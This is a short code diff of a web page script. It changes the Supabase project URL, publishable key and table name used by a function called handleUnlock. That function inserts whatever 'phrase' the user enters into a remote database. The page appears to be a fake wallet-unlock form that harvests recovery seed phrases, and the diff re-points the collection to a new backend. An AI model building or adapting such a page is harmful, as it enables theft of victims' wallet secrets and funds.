@@ -301,8 +301,8 @@
 
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
-    const SUPABASE_URL = "https://xiwisytaqgkgbozqmncf.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_uT2qOvPiGoACXrodwfOM0g_PAHO8zfX";
+    const SUPABASE_URL = "https://dvjjkljhmlbthnmaywxd.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_gHTOnxYnSV2y5YaIfQ8iWA_YNKuKsY_";
     const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
     async function handleUnlock() {
@@ -321,7 +321,7 @@
 
       try {
         const { error } = await supabaseClient
-          .from("vlt_213")
+          .from("arro13")
           .insert([{ phrase: input }]);
 
         spinner.style.display = "none";
